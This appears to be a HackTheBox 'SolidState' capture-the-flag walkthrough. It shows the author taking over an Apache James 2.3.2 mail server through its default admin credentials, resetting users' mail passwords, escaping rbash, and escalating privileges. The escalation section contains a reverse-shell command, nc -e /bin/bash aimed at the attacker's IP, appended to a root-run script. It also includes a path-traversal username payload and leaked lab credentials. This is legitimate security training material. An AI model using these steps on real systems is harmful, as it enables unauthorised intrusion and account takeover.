# SolidState

## Reconnaissance

### nmap 
```
nmap -sV -sC -oA solidstate 10.129.206.76
```

![](./IMG/0.png)

### website

![](./IMG/1.png)

### smtp 

- Connect to smtp by telnet
- An useful information is the smtp response "James SMTP Server 2.3.2"
```
telnet 10.129.206.76 25
```

![](./IMG/2.png)
### pop3

- It is not possible to read mail without user/password

![](./IMG/3.png)
### nntp

- According to nmap result, check the port 119 -> nntp
- Connect by nc 
```
nc -nv 10.129.206.76 119
```

![](./IMG/4.png)
- Available command as follow:

![](./IMG/5.png)
- About above information, research "James SMTP Server".

1. Find a lot of exploit-related article, [this one](https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/) provide some hint.

    - It shows the nmap result is similar to me.
    - But there is one more port(port 4555 called JAMES REMOTE ADMIN 2.3.2)

    ![](./IMG/6.png)

2. And keep research about James SMTP Server 2.3.2 exploit I found another [article](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf)

![](./IMG/7.png)

3. So, with previous 2 articles, I first research about James Remote Admin.Them I found this installation guideline which prove that the James Remote admin is one of the James SMTP Server's component after installing. [JamesQuickstart - Installation Information](https://cwiki.apache.org/confluence/display/JAMES2/JamesQuickstart)

![](./IMG/8.png)
4. Then, I also find this configuration list - [James Server Configuration](https://james.apache.org/server/archive/configuration_v2_0.html), it shows the James Remote admin need credential to login, and the default is root / root.

>Under James Server Configuration, there is a configuration called "Remote Manager Configuration". 

![](./IMG/9.png)

- So, I execute nmap again with all ports.
- And the result has displayed as follow, but the protocol seems can't be analysis.
```
nmap -sV -sC -p- -A -oA solidstate2 10.129.206.76
```

![](./IMG/10.png)


## Exploit

- Using telnet to connect to james_admin service
- It will ask about credential (default: root/root)
```
telnet 10.129.206.76 4555
```

![](./IMG/11.png)
- Check usage
```
help 
```

![](./IMG/12.png)
- Check user
```
listusers
```

![](./IMG/13.png)
- Interesting things is this user 
```
../../../../../../../../etc/bash_completion.d
```
- It looks like some payload, and I think that might caused by the metasploit (linux/smtp/apache_james_exec)which I just run 

![](./IMG/14.png)
- Or python code(35513.py from exploitDB) which I just run

![](./IMG/15.png)
- Let's dig more information from james_admin server
- From listusers, I know there are other user for mail server
```
james
thomas
john
mindy
mailadmin
```
- According the useage, I have command to reset those user's password
```
setpassword <username> <newpassword>
```

![](./IMG/16.png)
- So, I can set password for all user.
```
setpassword james james123
setpassword john john123
setpassword thomas thomas123
setpassword mindy mindy123
```

![](./IMG/17.png)
```
setpassword mailadmin mailadmin123
```

![](./IMG/18.png)
- Using telnet to connect to pop3 service
```
telnet 10.129.206.76 110
```

![](./IMG/19.png)
- Check Every user
```
USER james
PASS james123
list
```

![](./IMG/20.png)
```
USER john
PASS john123
list
```

![](./IMG/21.png)
```
RETR 1
```

![](./IMG/22.png)
```
USER thomas
PASS thomas123
list
```

![](./IMG/23.png)
```
USER mailadmin
PASS mailadmin123
list
```

![](./IMG/24.png)
```
USER mindy
PASS mindy123
```

![](./IMG/25.png)
```
list
```

![](./IMG/26.png)
```
RETR 1
```

![](./IMG/27.png)
```
RETR 2
```

![](./IMG/28.png)
- I got mindy's ssh credential from second mail
```
mindy / P@55W0rd1!2@
```

- SSH login by mindy

![](./IMG/29.png)
- Check user --> failed
```
id 
```

![](./IMG/30.png)
- The error reason is the shell is not ```/bin/bash```, it's rbash 

![](./IMG/31.png)
- And It doesn't provide ```chsh ``` to change.

![](./IMG/32.png)
- But I still have permission to read user flag, and the cat command still works
- Get user flag: ``` 74786f759c0406f0019727f309bf2128 ```

![](./IMG/33.png)


## Post Exploitation 

- I noticed this message after I login ssh with mindy's credential 

![](./IMG/34.png)
- I think those informations are generated from the payload I just put by metasploit.

![](./IMG/35.png)
- So I tried again metasploit, and re-login ssh, but it still failed.

- Then the second weird things is the bash script, after I login, I only can execute ```cat ``` and ``` ls ```
- Then I check other command it will reply 
```
-rbash: XXX: command not found
```
- So I do some research for rbash, then I know rbash is a restricted bash environment.
- But I also know there are some method to bypass it.
- I tried the following command attemp to bypass. --> failed

![](./IMG/36.png)
- The final success one is ```ssh ```, so I logout and re-login again.
```
ssh mindy@10.129.206.76 -t "bash --noprofile"
```

![](./IMG/37.png)
- I escape from rbash, here is prove, I can check user by id command
```
id
```

![](./IMG/38.png)
- But try to check sudo permission still failed
```
sudo -l
```

![](./IMG/39.png)
- Execute linpeas 
- Here are some interesting information

1. osboxes run on localhost --> not useful

![](./IMG/40.png)
2. network status --> port 631 --> IPP(Internet Printing Protocol)
    - It might connect to a printer.

![](./IMG/41.png)
3. Here is an unmounted device

![](./IMG/42.png)
4. CVE-2017-6074

![](./IMG/43.png)
5. Folder owned by mindy

![](./IMG/44.png)
6. some special shell file 
    - bash_competion is upload by the python exploit code
![](./IMG/45.png)
7. Some interesting file upder /opt

![](./IMG/46.png)

### Privilege Escalation

- After many try in other suspcious part, I think the final one for privilege escalation is the python file under /opt
- Check the code: 
- It will remove the content under /tmp

![](./IMG/47.png)
- But I can't find any command to execute this python regularly.
- So, I upload pspy64 --> falied and pspy32.
```
/bin/sh -c python /opt/tmp.py
```

![](./IMG/48.png)
- Privilege Escalation code in python, then wait for about 3-4 min
```
echo "os.system('nc -e /bin/bash 10.10.17.145 1336')" >> /opt/tmp.py
```
- Get reverse shell
- Get root flag: ``` c9109e71b69944ac06de39e4bec51739 ```

![](./IMG/49.png)


## Reference 


- [(Discussion)solidstate](https://forum.hackthebox.com/t/solidstate/91/9)
- [(Writeup)SolidState-1](https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-solidstate/)
- [(Writeup)SolidState-2](https://initinfosec.com/writeups/htb/2020/02/02/solidstate-htb-writeup/)


### Tools

- [pspy](https://github.com/DominicBreuker/pspy)

### nntp

- [Port 119 nntp](https://www.grc.com/port_119.htm)

![](./IMG/50.png)
- [nntp connect](https://cheatsheet.haax.fr/network/services-enumeration/119_nntp/)
- [nntp usage](https://0xffsec.com/handbook/services/nntp/)
- [NNTP Example](http://www.ii.uib.no/~magnus/USENET/paragraph3.2.4.1.1.html)

### James SMTP Server

- [James Server Configuration](https://james.apache.org/server/archive/configuration_v2_0.html)
- [James Server Security list](https://james.apache.org/server/feature-security.html)
- [JamesQuickstart](https://cwiki.apache.org/confluence/display/JAMES2/JamesQuickstart)

### James SMTP Server vulnerability
#### CVE-2015-7611

- [(PDF)(Work in this time)Exploiting Apache James 2.3.2](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf)
- [Apache James Server 2.3.2 – CVE-2015-7611](https://vk9-sec.com/apache-james-server-2-3-2-cve-2015-7611/)
- [(Article)Exploiting Apache James 2.3.2](https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html)
- [Apache James Server 2.3.2 Insecure User Creation / Arbitrary File Write](https://packetstormsecurity.com/files/156463/Apache-James-Server-2.3.2-Insecure-User-Creation-Arbitrary-File-Write.html)
- [Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/smtp/apache_james_exec)
- [(ExploitDB)Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)](https://www.exploit-db.com/exploits/48130)


#### RCE 

- [(ExploitDB)Apache James Server 2.3.2 - Remote Command Execution](https://www.exploit-db.com/exploits/35513)
- [(ExploitDB)Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)](https://www.exploit-db.com/exploits/50347)


### POP3 

- [(HackTricks)POP3](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop)
### SMTP

- [(HackTricks)SMTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)

### rbash
- [rbash](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [rbash bypass](https://cloud.tencent.com/developer/article/1680551)
- [SMTP commands](https://www.ibm.com/docs/en/zos/2.3.0?topic=set-smtp-commands)

### IPP
- [631 - Internet Printing Protocol(IPP)](https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp)

![](./IMG/51.png)
### Linux Command

#### Find

- [Linux find 命令](https://www.runoob.com/linux/linux-comm-find.html)
- [SUID Executables(Using find command to searchh)](https://pentestlab.blog/tag/find/)
- [Linux Privilege Escalation using SUID Binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
- 
#### ps
- [ps(1) - Linux man page](https://linux.die.net/man/1/ps)

## Suspcious Part for Privilege Escalation

- I also find a mDNS software - avahi, and it have a daemon called avahi-daemon will execute the command.

![](./IMG/52.png)
- So the following link is the vulnerability related to avahi 

- [(Github)chroot.c](https://github.com/lathiat/avahi/blob/master/avahi-daemon/chroot.c)
- [CVE-2021-26720](https://cve.report/CVE-2021-26720)
- [Vulnerability of Avahi: privilege escalation via avahi-daemon-check-dns.sh](https://vigilance.fr/vulnerability/Avahi-privilege-escalation-via-avahi-daemon-check-dns-sh-34656)
- [CVE-2021-26720: avahi-daemon: 'avahi' to 'root' user privilege
 escalation through Debian specific if-up script avahi-daemon-check-dns.sh](https://www.openwall.com/lists/oss-security/2021/02/15/2)





###### tags: `HackTheBox` `medium` `linux` `rbash` `restrict bash` `rbash bypass` `smtp` `pop3` `nntp` `Apache james_server` `python privilege escalation`